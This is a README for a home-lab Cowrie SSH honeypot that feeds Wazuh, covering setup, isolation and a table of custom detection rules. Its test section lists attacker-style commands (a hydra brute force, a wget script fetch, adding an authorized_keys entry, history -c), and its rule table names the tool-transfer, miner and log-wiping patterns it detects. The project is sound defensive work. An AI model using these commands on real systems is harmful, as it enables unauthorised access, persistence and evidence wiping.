# Cowrie SSH Honeypot → Wazuh

A Cowrie medium-interaction SSH honeypot running beside the single-node Wazuh stack. A
dedicated Wazuh agent container tails Cowrie's JSON log and ships every event to the manager,
where custom rules (IDs `100500–100599`) turn them into MITRE-mapped alerts.

```
 attacker (Mac / Ubuntu VM)
        │ ssh -p 2222
        ▼
 ┌──────────────┐  cowrie.json   ┌──────────────────┐  1514/tcp  ┌────────────────────┐
 │ cowrie       │──(shared vol)─►│ wazuh-agent      │───────────►│ wazuh.manager      │
 │ net: honeynet│                │ "cowrie-honeypot"│            │ cowrie_rules.xml   │
 └──────────────┘                │ net: single-node │            └────────┬───────────┘
                                 └──────────────────┘                     ▼
                                                                   dashboard :443
```

- **Isolation:** Cowrie sits on its own Docker network and can't reach the Wazuh containers.
  Only the agent joins `single-node_default`. Cowrie runs with all capabilities dropped.
- **Exposure:** port 2222 is bound to `127.0.0.1` by default. Don't port-forward it from your router.
- **RAM:** about 200–300 MB total (both containers have a 256 MB cap). The agent image is amd64-only,
  so it runs under Rosetta on Apple Silicon.

## Files

| Path | Purpose |
|------|---------|
| `docker-compose.yml` | Cowrie + agent containers |
| `cowrie/cowrie.cfg` | Hostname, SSH banner, JSON output, telnet off |
| `cowrie/userdb.txt` | Fake credentials (some deny, some "succeed" so you see post-login activity) |
| `wazuh-agent/ossec.conf` | Agent config: only reads `cowrie.json`; FIM/SCA/rootcheck off |
| `wazuh-manager/cowrie_rules.xml` | Detection rules |
| `scripts/deploy-rules.sh` | Copies the rules to the manager, creates the `honeypot` group, restarts the manager |
| `scripts/test-rules.sh` | Runs `sample-events.json` through `wazuh-logtest` |

## Bring it up

```bash
cd ../wazuh-docker/single-node && docker compose start
```

```bash
cd ../../cowrie-honeypot && ./scripts/deploy-rules.sh
```

```bash
./scripts/test-rules.sh
```

```bash
docker compose up -d
```

```bash
docker exec single-node-wazuh.manager-1 /var/ossec/bin/agent_control -l
```

The new agent shows up as `cowrie-honeypot` (ID 003) in the `honeypot` group.

Run `deploy-rules.sh` before `docker compose up`. The agent enrolls into the `honeypot`
group, and enrollment fails if that group doesn't exist yet.

## Attack it (from the Mac)

```bash
ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@127.0.0.1
```

Log in with `admin123`, then try `uname -a`, `wget http://example.com/x.sh`,
`echo key >> ~/.ssh/authorized_keys` and `history -c`.

Brute force (triggers 100511, then 100513 if hydra finds `admin123`):

```bash
hydra -l root -P passlist.txt -s 2222 -t 4 ssh://127.0.0.1
```

To attack it from the Ubuntu VM, put `COWRIE_BIND=0.0.0.0` in `cowrie-honeypot/.env`,
run `docker compose up -d`, then `ssh -p 2222 root@192.168.64.1` from the VM. Switch it back afterwards.

### Known quirks

- **Source IP is the Docker gateway** (e.g. `172.19.0.1`), not the real attacker. Docker Desktop on
  macOS NATs published ports. Per-IP correlation (100511/100513) still works, but every attacker
  looks like the same IP. To see real IPs, run Cowrie on a Linux host (e.g. the Ubuntu VM).
- **Cowrie really fetches URLs** that attackers `wget`/`curl` (that's how 100530 gets the SHA-256),
  so the honeypot needs outbound internet. Saved payloads go into `cowrie-downloads`.
- Rule 100503 (session closed, level 2) is below the manager's `log_alert_level` of 3, so it shows up in
  `wazuh-logtest` but not in the dashboard.

## Detections

| Rule | Level | Event | MITRE |
|------|-------|-------|-------|
| 100501 | 4 | New SSH connection | T1595 |
| 100502 | 3 | SSH client version | — |
| 100503 | 2 | Session closed | — |
| 100510 | 5 | Failed login | T1110 |
| 100511 | 10 | 8+ failed logins from one IP in 2 min | T1110.001 |
| 100512 | 10 | Successful login | T1078 |
| 100513 | 12 | Successful login after brute force (same IP, 10 min) | T1110.001, T1078 |
| 100520 | 7 | Any command | T1059.004 |
| 100521 | 8 | Discovery (`uname`, `/proc/cpuinfo`, `/etc/passwd`…) | T1082, T1033 |
| 100522 | 12 | Tool transfer (`wget`, `curl`, `tftp`…) | T1105 |
| 100523 | 12 | Persistence (`authorized_keys`, cron, `.bashrc`…) | T1098.004, T1053.003 |
| 100524 | 12 | Cryptominer (`xmrig`, `stratum+tcp`…) | T1496 |
| 100525 | 10 | Anti-forensics (`history -c`, log wiping) | T1070.003 |
| 100530 | 12 | File downloaded by attacker (URL + SHA-256) | T1105 |
| 100531 | 12 | File uploaded (SFTP/SCP) | T1105 |
| 100540 | 8 | SSH tunnel / proxy request | T1090 |

In the dashboard, filter with `rule.groups: cowrie` or `agent.name: cowrie-honeypot`. Cowrie's fields
are under `data.*`, e.g. `data.src_ip`, `data.username`, `data.password`, `data.input`.

## Operating

```bash
docker compose logs -f cowrie
```

```bash
docker compose exec cowrie tail -f var/log/cowrie/cowrie.json
```

```bash
docker compose down
```

`docker compose down -v` also deletes the captured logs and downloads, and a later `up` enrolls
a new agent ID. Downloaded payloads stay in the `cowrie-downloads` volume. Treat them as live malware.

## Ideas for next steps

- Active response: block `data.src_ip` on the *real* Ubuntu endpoint when 100512 fires.
- VirusTotal integration on `data.shasum` for rule 100530.
- A custom dashboard: top usernames/passwords, top source IPs, command timeline.
